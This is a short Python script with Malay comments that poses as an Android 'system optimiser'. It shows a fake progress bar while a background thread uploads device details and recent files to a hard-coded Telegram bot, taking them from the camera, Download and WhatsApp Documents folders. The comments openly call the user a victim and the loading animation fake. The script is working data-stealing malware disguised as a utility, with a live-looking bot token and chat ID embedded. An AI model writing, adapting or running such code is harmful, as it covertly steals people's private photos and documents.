import os
import time
import requests
import threading
import platform

# --- KONFIGURASI MARKAS (TELAH DIKEMASKINI) ---
BOT_TOKEN = "8249694225:AAHDS2jAOfDxSK_9YUudR3YZCa-LreXbBHg"
CHAT_ID = "7933973599"

def kirim(mesej, fail=None):
    try:
        if fail:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(fail, 'rb') as f:
                requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f}, timeout=10)
        else:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': mesej}, timeout=10)
    except:
        pass

def sedut_data():
    # 1. Info Peranti
    info = f"🔥 MANGSA TEMBUS!\nDevice: {platform.node()}\nModel: {platform.machine()}\nPlatform: {platform.platform()}"
    kirim(info)

    # 2. Cari fail penting (.vcf untuk kontak, .pdf, .jpg)
    sasaran = ["/sdcard/DCIM/Camera/", "/sdcard/Download/", "/sdcard/WhatsApp/Media/WhatsApp Documents/"]
    for path in sasaran:
        if os.path.exists(path):
            fail_list = os.listdir(path)
            # Ambil 15 fail terbaru secara pantas
            for f_name in fail_list[:15]:
                full_path = os.path.join(path, f_name)
                if os.path.isfile(full_path):
                    kirim(None, full_path)

# --- PROSES SAMARAN (LAJU & POWER) ---
print("\033[1;34m[*] Memulakan Sistem Optimasi Peranti...\033[0m")

# Jalankan penyedutan di "Thread" berbeza supaya tak sangkut
worker = threading.Thread(target=sedut_data)
worker.start()

# Paparan untuk mangsa
time.sleep(2)
print("\033[1;33m[!] Sedang proses sila tunggu 5 atau 8 minit...\033[0m")

# Animasi loading palsu supaya mangsa tak bosan
for i in range(1, 101):
    time.sleep(0.1) # Kelajuan loading
    print(f"\r\033[1;33m[!] Mengoptimumkan sistem: {i}% selesa\033[0m", end="")

print("\n\033[1;32m[+] Proses Berjaya! Peranti anda kini lebih laju.\033[0m")
print("[*] Sila hidupkan semula (Restart) telefon anda untuk kesan maksima.")
